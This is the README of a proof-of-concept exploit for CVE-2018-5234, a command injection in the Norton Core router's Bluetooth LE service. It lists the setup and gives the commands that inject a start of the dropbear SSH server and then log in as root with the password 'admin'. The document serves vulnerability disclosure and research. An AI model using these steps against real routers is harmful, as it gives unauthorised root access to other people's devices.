# PoC command injection in BLE service of Norton Core Secure WiFi Router (CVE-2018-5234)

To demonstrate the exploitation, we will use:
- OS GNU/Linux;
- Bluetooth dongle adapter;
- BlueZ utility (for testing Bluetooth connection).

In order to use the script, we will need to set all dependencies in a advance:

```shell
$ pip install -r ./requirements.txt
```

With the help of `BlueZ` utilities, we should ensure Bluetooth is enabled and
functions properly.

1. Restart the router to provide access to the engineering page.
2. Start the PoC on behalf of the root user (required for operating with
   Bluetooth) with the command on executing as an argument:

    ```shell
    $ ./ble_norton_core.py "/etc/init.d/dropbear start"
    ```

    After the script is successfully executed, we get access to the device via
    the SSH connection. We put `root` as a user and `admin` as password:

    ```shell
    $ ssh root@norton.core
    ```
